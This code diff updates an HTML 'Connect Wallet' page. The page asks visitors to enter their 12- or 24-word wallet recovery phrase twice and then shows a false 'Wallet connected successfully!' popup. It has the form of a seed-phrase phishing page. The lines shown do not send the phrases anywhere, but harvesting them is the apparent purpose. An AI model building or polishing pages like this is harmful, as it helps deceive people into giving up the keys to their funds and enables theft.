@@ -68,6 +68,19 @@
         color: #bfffe9;
       }
 
+      textarea {
+        width: 100%;
+        padding: 12px;
+        margin-top: 10px;
+        border: 1px solid #fff;
+        border-radius: 8px;
+        background: rgba(255, 255, 255, 0.15);
+        color: white;
+        resize: none;
+        overflow: hidden;
+        min-height: 60px;
+      }
+
       /* CHECKBOX ROW */
       .checkbox {
         display: flex;
@@ -95,6 +108,34 @@
         background: #11ffee;
         box-shadow: 0 0 12px #11ffee;
       }
+
+      /* POPUP STYLE */
+      #popup {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: #00483a;
+        padding: 22px;
+        width: 260px;
+        border-radius: 12px;
+        text-align: center;
+        border: 2px solid #00e6c3;
+        box-shadow: 0 0 15px #00e6c3;
+        z-index: 9999;
+      }
+
+      #popup button {
+        margin-top: 12px;
+        padding: 10px 22px;
+        border: none;
+        border-radius: 10px;
+        background: #00e6c3;
+        color: black;
+        font-weight: bold;
+        cursor: pointer;
+      }
     </style>
   </head>
 
@@ -104,20 +145,29 @@
       <h2 id="walletName"></h2>
 
       <textarea
+        id="phrase1"
         class="input-box"
         placeholder="Enter wallet phrase (12 or 24 words)"
       ></textarea>
 
       <textarea
+        id="phrase2"
         class="input-box"
         placeholder="Confirm wallet phrase"
       ></textarea>
 
       <label class="checkbox">
-        <input type="checkbox" /> Are you sure you entered correctly?
+        <input type="checkbox" id="confirmCheck" /> Are you sure you entered
+        correctly?
       </label>
 
-      <button class="btn">Connect Wallet</button>
+      <button class="btn" onclick="validateForm()">Connect Wallet</button>
+    </div>
+
+    <!-- POPUP -->
+    <div id="popup">
+      <p id="popupMsg">Please fill out this field.</p>
+      <button onclick="closePopup()">OK</button>
     </div>
 
     <script>
@@ -128,6 +178,38 @@
 
       let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
       document.getElementById("walletLogo").src = "wallet-icons/" + imgName;
+    </script>
+
+    <script>
+      // AUTO EXPAND TEXTAREA
+      document.querySelectorAll("textarea").forEach((box) => {
+        box.addEventListener("input", () => {
+          box.style.height = "auto";
+          box.style.height = box.scrollHeight + "px";
+        });
+      });
+
+      // VALIDATION + POPUP
+      function validateForm() {
+        const p1 = document.getElementById("phrase1").value.trim();
+        const p2 = document.getElementById("phrase2").value.trim();
+        const check = document.getElementById("confirmCheck").checked;
+
+        if (p1 === "") return showPopup("Please fill out this field.");
+        if (p2 === "") return showPopup("Please confirm the phrase.");
+        if (!check) return showPopup("Please tick the confirmation checkbox.");
+
+        showPopup("Wallet connected successfully!");
+      }
+
+      function showPopup(msg) {
+        document.getElementById("popupMsg").innerText = msg;
+        document.getElementById("popup").style.display = "block";
+      }
+
+      function closePopup() {
+        document.getElementById("popup").style.display = "none";
+      }
     </script>
   </body>
 </html>
